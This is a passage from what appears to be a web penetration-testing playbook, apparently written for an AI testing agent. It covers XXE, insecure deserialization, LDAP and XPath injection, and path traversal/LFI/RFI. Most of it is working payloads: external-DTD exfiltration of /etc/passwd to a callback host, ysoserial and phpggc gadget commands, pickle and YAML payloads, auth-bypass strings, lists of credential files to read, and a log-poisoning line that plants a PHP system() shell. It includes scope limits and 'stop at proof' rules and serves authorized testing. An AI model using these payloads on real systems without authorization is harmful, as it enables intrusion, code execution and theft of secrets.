file:///d:/                       (Windows drive enumeration)
netdoc:/etc/passwd                (Java alternative scheme)
```
Step 3, network reachability / blind confirm (no file read needed):
```xml
<!DOCTYPE r [<!ENTITY a SYSTEM "http://CANARY.oast.fun/x">]>
<r>&a;</r>
```
Step 4, PHP wrapper for files with XML-breaking characters:
```xml
<!DOCTYPE r [<!ENTITY a SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<r>&a;</r>
```
Step 5, parameter entities (works where general entities in the document body are blocked):
```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % p SYSTEM "http://CANARY.oast.fun/x">
  %p;
]>
<r>1</r>
```

**Blind OOB with external DTD.** The default for any blind XXE. Host `evil.dtd` on your collaborator
domain:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://CANARY.oast.fun/?d=%file;'>">
%eval;
%exfil;
```
Request body:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://CANARY.oast.fun/evil.dtd"> %dtd;]>
<r>1</r>
```
FTP variant, for multi-line content that breaks the HTTP URL (use an FTP listener):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://CANARY.oast.fun:2121/%file;'>">
%eval;
%exfil;
```

**Error-based** (no outbound HTTP allowed, but errors are verbose):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%err;
```
Local-only, no external DTD needed (Java, abusing a DTD already on disk):
```xml
<!DOCTYPE r [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///x/%file;&#x27;>">
  %eval; %err;
'>
%local_dtd;
]>
<r>1</r>
```
Other local DTDs to try: `/usr/share/xml/fontconfig/fonts.dtd`,
`/usr/share/xml/scdocbook/dtd/4.5/docbookx.dtd`, `C:\Windows\System32\wbem\xml\cim20.dtd`.

**XInclude.** Use when you cannot control the DOCTYPE (your input is only a *value* inside the app's XML):
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
As a single injected value:
```
<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>
<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="http://CANARY.oast.fun/x" parse="text"/>
```

**SVG upload.** The file content is the payload:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY a SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="0" y="20">&a;</text>
</svg>
```
Then view the rendered/thumbnailed image — the file contents are drawn into it. Also try the same file
with extensions `.svg`, `.svgz` (gzip it), `.xml`, `.jpg`, and with `Content-Type: image/svg+xml`,
`image/png`, `text/xml`. SVG also carries XSS (3.16) and ImageMagick payloads (3.3).

**DOCX / XLSX / PPTX.** Unzip, inject, rezip:
```
unzip doc.docx -d x && \
  sed -i '1s|^|<!DOCTYPE r [<!ENTITY a SYSTEM "http://CANARY.oast.fun/x">]>|' x/word/document.xml && \
  (cd x && zip -r ../evil.docx .)
```
Inject into `[Content_Types].xml`, `word/document.xml`, `xl/workbook.xml`, `docProps/core.xml`. XLSX also
carries formula injection (3.17) and external-link SSRF (`xl/externalLinks/`).

**SOAP.** Inject in the body, the header, and the `xsi:type`:
```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <!DOCTYPE-less: put entity ref where a string is expected -->
  </soap:Header>
  <soap:Body><ns:getUser><id>&a;</id></ns:getUser></soap:Body>
</soap:Envelope>
```
Also test: SOAPAction header value, `wsa:To`/`wsa:ReplyTo` (SSRF), WS-Addressing, and MTOM/XOP
`<xop:Include href="cid:...">` with `href="file:///etc/passwd"`.

**XML injection without entities.** Where your value is placed inside an element:
```
</name><admin>true</admin><name>
</name><!--
]]><![CDATA[<x>
&lt;
&#x41;
<![CDATA[</name><role>admin</role><name>]]>
```
Comment/CDATA breakout and second-element injection ("XML round-trip" / last-wins parsing) is how
signature-wrapping and SAML assertion confusion start. Test which element the app reads when you supply
two.

**Encoding tricks for filters.** If `<!DOCTYPE` or `<!ENTITY` is string-blocked:
```
UTF-16 encode the whole body (iconv -f UTF-8 -t UTF-16BE) and send with Content-Type: application/xml
UTF-7: <?xml version="1.0" encoding="UTF-7"?> then +ADw-!DOCTYPE...
Change the encoding declaration: encoding="UTF-16", "IBM037", "cp037"
```
`iconv -f UTF-8 -t IBM037 body.xml` defeats naive `<!ENTITY` string matching on several Java stacks.

**RISK — do not use.** Billion laughs / quadratic blowup / entity expansion bombs:
```
<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;...">   DO NOT SEND
```
These are DoS and a program violation (`../CLAUDE.md` 2). To prove entity expansion is enabled, use an
**OOB DTD** (above): a single DNS/HTTP hit proves the parser resolves external entities, which is strictly
more impact than a memory bomb and costs the target nothing. Same for `file:///dev/random` and
`file:///proc/self/fd/0` — do not.

**Confirm.**
1. File content in the response, or an OOB hit whose canary maps to this exact request (3.23).
2. Control: same body with the entity defined but unreferenced → no hit. Same body with a nonexistent
   local file → different error. This rules out the app fetching your URL for an unrelated reason.
3. Save the exact XML body and the response.

**Escalate — stop at proof.** `/etc/hostname` or `/etc/passwd` (non-sensitive, universally accepted as
proof) → `/proc/self/environ` if the program needs to see secret exposure (redact values in the report) →
name the SSRF reach (`http://localhost:8080/` returning a banner) without scanning the network (3.11).
Do not read application source en masse, do not read `/root/.ssh/id_rsa`, do not fetch cloud metadata
credentials and use them. If you read a config file with credentials, stop and report (`../CLAUDE.md` 4).
`expect://` + XXE = RCE on PHP: prove with `id` only, and only if `expect` is actually loaded.

**Commonly missed.**
- JSON endpoints that also accept XML. Change `Content-Type` to `application/xml` and send an XXE body.
  This is one of the highest-yield five-second tests in the kit and almost nobody does it.
- OOXML uploads. Everyone tests `.svg` and `.xml`; `.docx`/`.xlsx` go through a different library.
- SAML. A separate parser, often an old one, and the value is base64 so scanners do not see XML.
- XInclude, when the DOCTYPE is unreachable because your input is only a leaf value.
- Blind. No reflection is not a negative (`../CLAUDE.md` 6.8) — you need the external-DTD callback.
- Local-DTD error-based, when egress is blocked. Testers conclude "no XXE" because no callback arrived.
- Parameter entities vs general entities — many hardening configs block only the latter.
- The `Content-Type` of a multipart part, and the part's filename, not just the file bytes.

---

## 3.7 Deserialization

**What it is.** The app reconstructs objects from attacker bytes. Impact is usually RCE.

**How to spot a serialized blob.** Look in cookies, hidden form fields, `state`/`data`/`token`/`payload`
params, `Authorization` values, WebSocket frames, cache keys, and message queues.

| Prefix / marker | Format |
|---|---|
| `rO0AB` (base64) / `AC ED 00 05` / `aced0005` (hex) | Java serialized |
| `H4sIA` (base64) | gzip — decompress, then re-check (often Java or JSON inside) |
| `AAEAAAD/////` (base64) / `00 01 00 00 00 FF FF FF FF` | .NET `BinaryFormatter` |
| `/wEP` , `/wEW` , `dDw` (base64) | ASP.NET ViewState |
| `O:8:"` , `a:2:{` , `s:5:"` | PHP `serialize()` |
| `gASV` , `gAJ9` , `gAN9` , `\x80\x04\x95` , `\x80\x03}` | Python pickle |
| `BAh` , `\x04\bo:` | Ruby `Marshal` |
| `--- !ruby/object:` , `!!python/object:` , `!!javax.script` | YAML with type tags |
| `{"rce":"_$$ND_FUNC$$_function` | Node `node-serialize` |
| `{"@type":"com.` | fastjson / Jackson polymorphic |
| `PD94bWw` (base64) | XML — check for XXE first (3.6), then XStream/XmlSerializer |
| `eyJ` | base64 JSON — JWT or a JSON blob; check `alg`, and any `@type`/`$type` key |
| `msgpack`/`CBOR` binary, `\x82\xa3` | msgpack/CBOR — type-confusion, sometimes typed |
| `phar` / `__HALT_COMPILER` inside an uploaded file | PHP phar |

Quick triage:
```
echo 'rO0ABXNy...' | base64 -d | xxd | head
echo 'rO0ABXNy...' | base64 -d > blob.bin && file blob.bin
python3 -c "import pickletools,sys;pickletools.dis(open('blob.bin','rb').read())"
php -r 'var_dump(unserialize(file_get_contents("blob.bin")));'
```

**Where it hides.**

| Stack | Sink |
|---|---|
| Java | `ObjectInputStream.readObject`, RMI/JMX, JMS, JSF `javax.faces.ViewState`, Spring HTTP invoker, `XStream.fromXML`, Jackson with `enableDefaultTyping`, fastjson `parseObject`, Kryo, Hessian/Burlap, SnakeYAML `new Yaml().load()`, Apache Commons `SerializationUtils` |
| .NET | `BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter`, ViewState without MAC or with a leaked machine key, `JavaScriptSerializer` with a `SimpleTypeResolver`, `Json.NET` with `TypeNameHandling != None`, `NetDataContractSerializer`, `SoapFormatter`, `XmlSerializer` with attacker-controlled type |
| PHP | `unserialize()` on any input, phar deserialization via *any* file operation on a `phar://` path, Laravel `X-XSRF-TOKEN`/cookie payloads, WordPress option/meta values, `yaml_parse` |
| Python | `pickle.loads`, `cPickle`, `jsonpickle`, `yaml.load` (non-safe), `dill`, `shelve`, `numpy.load(allow_pickle=True)`, Django session with the pickle serializer, celery with the pickle serializer |
| Ruby | `Marshal.load`, `YAML.load`/`Psych.load`, Rails cookie store with a leaked `secret_key_base`, `Oj.load` in compat mode |
| Node | `node-serialize`, `funcster`, `serialize-to-js`, `js-yaml` `load` with unsafe schema, `cryo` |

**Detect — safe probes.**
1. Truncate the blob by one byte → expect a *deserialization-specific* error (`StreamCorruptedException`,
   `unserialize(): Error at offset`, `UnpicklingError`, `ArgumentException: End of Stream`, `TypeError:
   incompatible marshal`). That error alone tells you the format and that it is parsed.
2. Flip a byte in the middle → different error.
3. Change a field's length prefix in PHP serialization (`s:5:"admin"` → `s:4:"admin"`) → parse error
   confirms `unserialize()`.
4. Java: send a valid but trivial object graph (serialized `java.lang.String` "x") and see whether the
   error changes from "corrupt stream" to "ClassCastException" — proves `readObject` runs before type checks.
5. DNS-only gadget for a no-output confirm (Java, no RCE, no side effect):
```
ysoserial URLDNS http://CANARY.oast.fun > payload.bin
base64 -w0 payload.bin
```
`URLDNS` is the correct first Java gadget every time: it only performs a DNS lookup, it needs no
third-party library on the classpath, and it is non-destructive. A DNS hit = confirmed deserialization.

6. .NET: `ysoserial.net -g TypeConfuseDelegate -f Json.Net -c "nslookup CANARY.oast.fun"` — still an exec,
   so prefer detecting via the `$type`/`__type` probe first:
```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","x":1}
{"$type":"System.IO.FileInfo, System.IO.FileSystem","fileName":"x"}
{"__type":"System.Windows.Data.ObjectDataProvider"}
{"@type":"java.net.InetAddress","val":"CANARY.oast.fun"}
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://CANARY.oast.fun/x","autoCommit":true}
```
An error naming the type, or a DNS hit for `java.net.InetAddress`, is a clean non-destructive confirm.

7. ViewState: check `__VIEWSTATE` for MAC. `viewgen`/`ysoserial.net` with `--isdebug`; if
   `EnableViewStateMac=false` (rare now) or you have a machine key from a disclosure finding
   (`02-info-disclosure.md` — leaked `web.config`), it is signable. Probe:
```
__VIEWSTATE=/wEPDwUKLTE... (truncate one char)  -> "Validation of viewstate MAC failed" = MAC on
__VIEWSTATEGENERATOR / __EVENTVALIDATION present -> WebForms confirmed
```

8. PHP phar — needs a file operation on a path you control (3.10 overlaps):
```
phar://uploads/avatar.jpg/x
phar:///var/www/uploads/avatar.jpg/test
compress.zlib://phar:///tmp/x.phar/a
```
Build with `phpggc`:
```
phpggc -p phar -o evil.phar Monolog/RCE1 system id
phpggc -p phar-jpeg -o evil.jpg Laravel/RCE9 system id
```
Then get the file uploaded and point any of `file_exists`, `is_file`, `md5_file`, `getimagesize`,
`file_get_contents`, `unlink`, `fopen`, `copy`, `include`, `stat` at `phar://<path>/x`.

9. Python pickle — the smallest non-destructive proof:
```python
import pickle,base64
class P:
    def __reduce__(self):
        import socket
        return (socket.gethostbyname, ('CANARY.oast.fun',))
print(base64.b64encode(pickle.dumps(P())).decode())
```
DNS only, no command run. Use this before any `os.system` gadget.

10. Ruby YAML / Marshal probe:
```yaml
--- !ruby/object:Gem::Requirement
requirements: !ruby/object:Gem::DependencyList {}
```
An error mentioning `Gem::Requirement` proves unsafe YAML loading. Python equivalent:
```yaml
!!python/object/apply:socket.gethostbyname ["CANARY.oast.fun"]
!!python/object/apply:os.system ["id"]
!!python/name:os.system {}
```
Use the `gethostbyname` one first.

11. Node `node-serialize`:
```json
{"x":"_$$ND_FUNC$$_function(){require('dns').lookup('CANARY.oast.fun',function(){})}()"}
```

**Gadget tooling.** By name only; run them locally to build payloads, never point them at the target
as a scanner.

| Tool | Target | Typical first gadget |
|---|---|---|
| `ysoserial` | Java | `URLDNS` (DNS only), then `CommonsCollections1-7`, `CommonsBeanutils1`, `Jdk7u21`, `Spring1`, `Hibernate1`, `Groovy1`, `Click1`, `C3P0` |
| `ysoserial.net` | .NET | `TypeConfuseDelegate`, `ActivitySurrogateSelector`, `ObjectDataProvider`, `WindowsIdentity`; formatters `Json.Net`, `BinaryFormatter`, `LosFormatter`, `SoapFormatter` |
| `phpggc` | PHP | `Monolog/RCE*`, `Laravel/RCE*`, `Symfony/RCE*`, `WordPress/RCE*`, `Guzzle/FW1` (file write — avoid), `ZendFramework/RCE*` |
| `marshalsec` | Java JNDI/RMI/LDAP + SnakeYAML, XStream, Hessian, Jackson | pairs with 3.18 |
| `GadgetProbe` | Java | classpath fingerprinting via DNS — non-destructive, use it before picking a gadget |
| `viewgen` | ASP.NET ViewState | needs machine key |
| `ruby-deserialization` gadget chains | Ruby | universal `Gem::Requirement` chain |
| `pickle` stdlib | Python | write your own `__reduce__` |

`GadgetProbe` is the right second step after `URLDNS` confirms: it tells you which libraries are on the
classpath using only DNS lookups, so you pick one working gadget instead of spraying twenty RCE payloads
at a production box.

**Confirm.**
1. `URLDNS` / `gethostbyname` / `InetAddress` DNS hit with a per-request canary (3.23). That is a full
   confirmation of deserialization with zero code execution.
2. Control: same request with the blob's last byte flipped → no hit, parse error.
3. Only if the program requires RCE evidence, one `id`/`whoami`/`hostname` gadget, once.

**Escalate — stop at proof.** DNS callback → classpath/type disclosure → a single command whose output
you show. Stop there. No shells, no persistence, no writing files, no `Guzzle/FW1`-style file-write
gadgets, no in-memory agent loading. Write the finding as "unauthenticated Java deserialization on
`<param>`, confirmed via URLDNS, RCE demonstrated with `id` (output: uid=33(www-data))". That is a
maximum-severity report without touching anything.

**Commonly missed.**
- The blob is not base64-obvious. URL-safe base64 (`-`/`_`), hex, gzip+base64, or split across two
  cookies. Decode everything that looks opaque.
- Cookies. Session cookies on Rails/Laravel/JSF are serialized objects, and testers treat cookies as
  read-only.
- Phar. The sink is a *file function*, not `unserialize`. Any `file_exists($_GET['x'])` is a phar sink.
- ViewState with a machine key that leaked in a `web.config`, backup, or source map — link the disclosure
  finding to this one (`02-info-disclosure.md`).
- `TypeNameHandling` in an API that otherwise looks like plain JSON. Probe with `$type`, it costs one request.
- YAML. Config import features take YAML and use the unsafe loader.
- Jackson/fastjson `@type` — the request is JSON, so nobody thinks "deserialization".
- Message queues and webhooks: the blob may enter via a channel you are not proxying.
- Concluding "no RCE gadget on the classpath" = no bug. `readObject` on attacker bytes is the bug; report
  it with the DNS proof.

---

## 3.8 LDAP injection

**What it is.** Input goes into an LDAP search filter or DN. Filters use prefix notation, so the
breakout characters are `)`, `(`, `*`, `&`, `|`, `!`.

**Where it hides.**
- Corporate SSO / AD login forms (`sAMAccountName`, `uid`, `mail`).
- "Find a colleague" / user directory / group lookup / org chart.
- Admin user search, license seat lookup, shared-mailbox picker.
- Anything with `ou=`, `dc=`, `cn=`, `memberOf` visible in a parameter, error, or JS bundle.
- SCIM endpoints (`/scim/v2/Users?filter=`) — RFC 7644 filter syntax, injectable the same way.
- Bind DN construction: `uid=<input>,ou=users,dc=x,dc=com` — DN injection, different from filter injection.

**Detect.** Metacharacter probes — watch for a filter-syntax error or a changed result set:
```
*
(
)
\
|
&
!
*)
*)(&
*))%00
(|(objectClass=*))
admin*
admin)(|(1=1
x' or 1=1 or 'x'='y          (not LDAP, but tells you it is not SQL)
```
Auth bypass shapes (username field, any password):
```
*
*)(uid=*))(|(uid=*
admin)(&)
admin)(!(&(1=0
admin))(|(|
*)(objectClass=*
admin*)((|userPassword=*)
```
Password field, with a valid username:
```
*
*)(&
anything)(cn=*
```
Always-true and always-false injections for the boolean oracle:
```
true :  x)(|(cn=*))
false:  x)(&(cn=nonexistentvalue12345))
true :  *)(|(objectClass=*)
false:  *)(&(objectClass=nonexistent)
```
SCIM filter injection:
```
userName eq "x" or userName pr
userName co "" 
userName eq "x") or (1 eq 1
emails[type eq "work"].value co "@"
```

**Blind attribute enumeration.** Wildcards give you a per-character oracle without any output channel
beyond "found / not found":
```
uid=admin)(userPassword=a*
uid=admin)(userPassword=b*
uid=admin)(description=*
uid=admin)(mail=*@*
uid=admin)(objectClass=*
```
Attribute existence sweep (tells you the schema):
```
)(mail=*)(
)(userPassword=*)(
)(sAMAccountName=*)(
)(memberOf=*)(
)(unicodePwd=*)(
)(ms-Mcs-AdmPwd=*)(          LAPS admin password attribute — if it exists, stop and report
)(sshPublicKey=*)(
)(employeeNumber=*)(
```
Character-by-character on an attribute value:
```
)(cn=a*)(      -> hit means some cn starts with 'a'
)(cn=ad*)(
)(cn=adm*)(
```
Use the app's own "found/not found" response as the oracle. Cap request rate per `../CLAUDE.md` 2.

**DN injection** (when your value is placed in the bind DN, not the filter):
```
uid=admin,ou=users,dc=x,dc=com
admin,ou=admins
admin\2Cou\3Dadmins
admin+cn=x
*
```
And LDAP-specific escaping to test the filter's escaping code:
```
\2a   (*)
\28   (()
\29   ())
\5c   (\)
\00
```

**Confirm.**
1. `(|(objectClass=*))`-style injection returns more records than the baseline, deterministically.
2. `*)(&(cn=nonexistent12345)` returns fewer/none. Two-sided oracle.
3. Auth bypass: a session for an account whose password you did not supply — use **your own** second test
   account (`../CLAUDE.md` 2, keep it yours).
4. Save both requests.

**Escalate — stop at proof.** Enumerate attribute *names* (schema), prove the boolean oracle with 3-4
characters of one attribute on your own account, show the record-count change. Do not enumerate the whole
directory, do not extract other employees' details, do not read `userPassword`/`unicodePwd`/LAPS values —
if you can, say so and stop (`../CLAUDE.md` 4). Do not attempt LDAP writes (`ldapmodify`-style injection
is destruction).

**Commonly missed.**
- `*` alone in a username field. One character, frequently a full user enumeration, almost never tested.
- SCIM `filter=` — it looks like a modern REST API, and the filter language is injectable.
- Directory search boxes that return "no results" for everything — that is your boolean oracle, not a
  dead end.
- The password field. Filter injection there bypasses auth on `(&(uid=x)(userPassword=y))` designs.
- Apps that use LDAP only for group membership checks: injecting into the group name grants roles.
- Error messages containing the filter — that is also a disclosure finding (`02-info-disclosure.md`).

---

## 3.9 XPath and XQuery injection

**What it is.** Input goes into an XPath/XQuery expression over an XML document. Same shape as SQLi with a
different syntax and, usually, no error text.

**Where it hides.**
- Legacy apps with an XML user store (`users.xml`) — login and lookup.
- XML config lookups, feature-flag services, price/catalogue XML.
- SOAP backends that query XML natively, BaseX/eXist-db/MarkLogic endpoints.
- Sitemap/RSS filtering features, XSLT parameters.
- Anything where you see `//user[...]` in an error, a JS file, or a source map.
- Endpoints named `xpath`, `expr`, `query`, `select`, `node`, `path`.

**Detect.** Syntax breakouts:
```
'
"
'or'1'='1
' or '1'='1
" or "1"="1
'or 1=1 or 'a'='a
x' or name()='username' or 'x'='y
']|//*|//*['
' and count(/*)=1 and '1'='1
' and count(/*)=2 and '1'='1
*
//*
1 or 1=1
] | //user/* | a[
```
Auth bypass (classic `//user[name/text()='X' and pass/text()='Y']`):
```
user:  ' or '1'='1
user:  ' or 1=1 or ''='
user:  admin' and '1'='1
pass:  ' or '1'='1
user:  ']|//user[position()=1]|a['
```
XQuery-specific:
```
' or 1=1 (: comment :) or '
x'] , doc('http://CANARY.oast.fun/x') , a['
'; declare variable $x external; '
x' return doc('/etc/passwd') (:
for $i in (1 to 5) return $i
```
XQuery `doc()`/`fn:doc()` is an SSRF and file-read primitive — pair with 3.11 and 3.6.

**Blind extraction.** Structure first, then names, then values.
```
count(/*)=1
count(/*[1]/*)=5
string-length(name(/*[1]))=8
substring(name(/*[1]),1,1)='u'
count(//user)=3
string-length(//user[1]/password)=32
substring(//user[1]/password,1,1)='a'
substring((//user[position()=1]/child::node()[position()=2]),1,1)='a'
```
Injected form, each as the whole parameter value:
```
' and count(/*)=1 and '1'='1
' and string-length(name(/*[1]))=8 and '1'='1
' and substring(name(/*[1]),1,1)='u' and '1'='1
' and substring(//user[1]/password,1,1)='a' and '1'='1
' and count(//user[starts-with(name,'a')])>0 and '1'='1
```
Node-name harvesting without knowing the schema:
```
' and name(/*[1])='users' and '1'='1
']|//*[starts-with(name(),'a')]|a['
' or //*[contains(text(),'admin')] or '
```
XPath 2.0 / XQuery OOB channel when there is no reflected output:
```
' and doc('http://CANARY.oast.fun/?x=1') and '1'='1
' and fn:doc(concat('http://',substring(//user[1]/password,1,5),'.CANARY.oast.fun/')) and '1'='1
' and unparsed-text('file:///etc/passwd') and '1'='1
```

**Confirm.**
1. Two-sided oracle: `count(/*)=1` and `count(/*)=2` must give opposite results, and only one can be true.
2. Extract a value you already know (your own username) character by character to prove the oracle, then stop.
3. Save the pair.

**Escalate — stop at proof.** Document structure + node names + 3-4 characters of one value on your own
record. State that full document extraction is possible. Do not extract other users' credentials. If
`doc()`/`unparsed-text()` works, note file read and SSRF reach and stop (do not walk the filesystem).

**Commonly missed.**
- No error output → assumed not injectable. XPath rarely errors visibly; you need the boolean oracle.
- XQuery `doc()` as a file-read/SSRF primitive. Testers treat XPath as low impact and move on.
- `]|//*|//*[` — the "dump everything" payload. One request, and it often returns the entire document.
- XPath inside a SOAP body where the value is a child element you control.
- XSLT parameters and `document()` in XSLT — adjacent sink, same primitive.

---

## 3.10 Path traversal, LFI, RFI

**What it is.** Input becomes part of a filesystem path or an include/require target.

**Where it hides.**

| Parameter shape | Notes |
|---|---|
| `file`, `filename`, `path`, `doc`, `document`, `attachment`, `download`, `export`, `report` | direct |
| `page`, `view`, `template`, `include`, `module`, `layout`, `tpl`, `theme`, `skin` | include sinks |
| `lang`, `locale`, `country`, `region`, `tz` | `include("lang/".$l.".php")` |
| `img`, `image`, `avatar`, `icon`, `logo`, `thumb`, `src`, `photo` | image servers |
| `id` where the id maps to a file on disk | not obvious from the name |
| `style`, `css`, `js`, `font`, `asset`, `res`, `resource` | static handlers |
| `key`, `object`, `blob`, `s3key`, `prefix` | object-store key traversal (`../` in an S3 key) |
| Path segments, not parameters | `/files/2024/report.pdf` → `/files/../../etc/passwd` |
| Upload `filename=` in multipart | write-side traversal |
| Archive member names inside an uploaded zip/tar | zip-slip |
| `Referer`/`X-Original-URL`/`X-Rewrite-URL` | routing-level traversal |
| Cookie holding a template or theme name | |

**Detect — encodings.** Work down the list; each defeats a different filter.
```
../../../etc/passwd
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/etc/passwd
..;/..;/..;/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
%c0%ae%c0%ae%2fetc%2fpasswd
%e0%80%ae%e0%80%ae/etc/passwd
%uff0e%uff0e%u2215etc%u2215passwd
..%c0%af..%c0%afetc%c0%afpasswd
%c1%9c..%c1%9c..etc%c1%9cpasswd
..%255c..%255cwindows%255cwin.ini
/etc/passwd
//etc/passwd
///etc//passwd
file:///etc/passwd
/./././etc/passwd
/var/www/html/../../../etc/passwd
....................//etc/passwd
```
Absolute-path and prefix-defeat tricks:
```
/expected/dir/../../../etc/passwd        satisfies a "must start with /expected/dir" check
/expected/dir/%2e%2e/%2e%2e/etc/passwd
....//expected/dir/../../etc/passwd
/etc/passwd%00/expected/dir              null byte (PHP<5.3.4, some Java, some Go)
/etc/passwd%00.png
/etc/passwd.png                          when extension is appended: try removing it first
/etc/passwd%20
/etc/passwd/.
/etc/passwd/./
/etc/passwd?
/etc/passwd#
```
Suffix-defeat (app appends `.php`/`.html`): null byte, path truncation (old PHP), or a wrapper:
```
../../../etc/passwd%00
../../../etc/passwd/././././././[repeat to 4096 chars]
php://filter/convert.base64-encode/resource=../../../etc/passwd
```
Windows:
```
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
....\\....\\windows\\win.ini
C:\windows\win.ini
C:/windows/win.ini
\\?\C:\windows\win.ini
\\127.0.0.1\C$\windows\win.ini            UNC — also an SSRF/NTLM-leak primitive
\\CANARY.oast.fun\share\x                 UNC to your host: blind confirm via SMB/DNS
file.txt::$DATA                           ADS: read source of a script instead of executing it
file.php::$DATA
web.config::$INDEX_ALLOCATION
index.php:.:$DATA
```
RISK: UNC to an external host makes the server authenticate outbound (NTLM hash exposure). Point it at
your own collaborator host, capture only that it connected, and do not crack or relay anything. A DNS-only
hit is enough proof.

**High-value read targets** (non-destructive, prove impact fast):
```
/etc/passwd
/etc/hostname
/etc/hosts
/etc/issue
/proc/self/environ          secrets, DB URLs, cloud creds  (redact in report)
/proc/self/cmdline
/proc/self/cwd/app.py       via the cwd symlink
/proc/self/fd/0..20         open files, including deleted ones
/proc/net/tcp               listening sockets -> informs 3.11 without scanning
/proc/version
/var/log/nginx/access.log   for log poisoning
/var/log/apache2/access.log
/var/log/auth.log
/app/.env  /.env  /var/www/.env
/app/config/database.yml    Rails
/var/www/html/wp-config.php
/WEB-INF/web.xml            Java
/WEB-INF/classes/application.properties
/usr/local/tomcat/conf/tomcat-users.xml
C:\inetpub\wwwroot\web.config
C:\Windows\repair\SAM        RISK: do not, that is credential material
~/.aws/credentials           RISK: stop and report if reachable, do not use the keys
~/.ssh/id_rsa                RISK: same
/run/secrets/kubernetes.io/serviceaccount/token   RISK: same
```
Reading a file that *contains* credentials is `../CLAUDE.md` 4 territory: stop reading, report.

**PHP wrappers.**
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/zlib.deflate/convert.base64-encode/resource=index.php
php://input                                (POST body becomes the included file)
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
data:text/plain,<?php echo 1337; ?>
expect://id                                RISK: RCE, prove with id only, rarely enabled
zip://uploads/x.zip%23payload.php
phar://uploads/x.phar/x                    see 3.7
compress.zlib://../config.php
glob:///etc/*                              directory listing via glob wrapper
php://filter/string.strip_tags/resource=... (crash oracle)
php://filter chain to RCE (php_filter_chain_generator)  RISK: ask operator first
```
`php://filter` with base64 is the single best LFI primitive: it reads PHP source without executing it, so
you get config files and credentials with no side effects. Start there.

**Log poisoning** (turns file read into RCE on PHP):
```
1. curl -A '<?php system($_GET["c"]); ?>' https://target/
2. ?page=../../../var/log/nginx/access.log&c=id
```
Poisonable sinks: `access.log`, `error.log`, `/var/log/mail.log` (via SMTP `VRFY`),
`/var/log/auth.log` (via SSH username — usually out of scope), `/proc/self/environ`
(via `User-Agent`), `/var/lib/php/sessions/sess_<PHPSESSID>` (via any stored session value),
`/tmp/sess_<id>`, `/var/log/vsftpd.log`.
RISK: writing `<?php system() ?>` into a log is writing a webshell-equivalent. Prefer
`<?php echo 7*7; ?>` or `<?php echo md5("CANARY"); ?>` as the proof — it demonstrates execution without
leaving a usable shell. If you must prove command exec, use `<?php echo shell_exec("id"); ?>` and note in
the report that the log entry should be purged.

Session poisoning is the cleanest variant: set a profile field to `<?php echo md5("CANARY"); ?>`, then
include `/var/lib/php/sessions/sess_<your session id>`. It only touches your own session file.

**RFI.** Only where `allow_url_include` / equivalent is on:
```
?page=http://CANARY.oast.fun/x.txt
?page=https://CANARY.oast.fun/x.txt
?page=//CANARY.oast.fun/x.txt
?page=\\CANARY.oast.fun\x.txt
?page=http://CANARY.oast.fun/x.txt%00
?page=http://CANARY.oast.fun/x.txt?
?page=data://text/plain;base64,...
?page=ftp://CANARY.oast.fun/x.txt
```
A request arriving at your listener proves RFI even if inclusion then fails. Serve a harmless
`<?php echo md5("CANARY"); ?>` — not a shell.

**Traversal via upload filename** (write side):
```
filename="../../../../var/www/html/x.txt"
filename="..\..\..\..\inetpub\wwwroot\x.txt"
filename="....//....//x.txt"
filename="%2e%2e%2f%2e%2e%2fx.txt"
filename="/var/www/html/x.txt"
filename="x.txt/../../../../tmp/x.txt"
filename=".htaccess"
filename="web.config"
filename="../.env"
```
RISK: writing outside the upload dir can overwrite a real file. Never target an existing filename. Use a
random name (`canary-<id>.txt`) and a directory you can verify, then prove the write by reading it back.
Do not write `.php`/`.jsp`/`.aspx` into a web root — if the traversal works, a `.txt` written to the web
root and fetched over HTTP is complete proof of arbitrary file write.

**Zip-slip / archive extraction.**
```
python3 -c "
import zipfile
z=zipfile.ZipFile('slip.zip','w')
z.writestr('../../../../tmp/canary-1234.txt','canary')
z.close()"
```
Variants to try as member names: `../x`, `..\\x`, `/tmp/x` (absolute), `a/../../x`, a symlink member
pointing at `/etc/passwd` (tar supports symlinks; `tar -czf x.tar.gz link`), and a member with a very long
name. Also test tar, 7z, and `.jar`/`.war`/`.apk`/`.ipa`/`.docx` (all zips). Symlink extraction is the
quiet one: extract a symlink named `x` pointing to `/etc/passwd`, then read the uploaded file back through
